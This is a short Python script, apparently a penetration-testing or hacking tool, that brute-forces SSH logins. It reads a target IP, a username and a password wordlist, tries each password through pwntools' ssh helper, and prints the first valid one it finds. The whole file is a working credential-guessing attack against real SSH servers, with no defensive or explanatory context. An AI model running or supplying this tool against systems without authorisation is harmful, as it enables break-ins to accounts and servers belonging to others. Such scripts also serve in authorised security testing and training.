from pwn import *
import paramiko
from termcolor import colored

host = input('Enter host IP address: ')
username = input("Enter username: ")
wordlist =input('Enter wordlist path: ')
attempts = 0

with open(wordlist, "r") as password_list:
	for password in password_list:
		password = password.strip("\n")
		try:
			print("[{}] Attempting password: '{}'!".format(attempts, password))
			response = ssh(host=host, user=username, password=password, timeout=1)
			if response.connected():
				print(colored("[Success] Valid password found: '{}'!".format(password), "green"))
				response.close()
				break
			response.close()
		except paramiko.ssh_exception.AuthenticationException:
		    print(colored("[X] Invalid password!", "red"))
		attempts += 1   
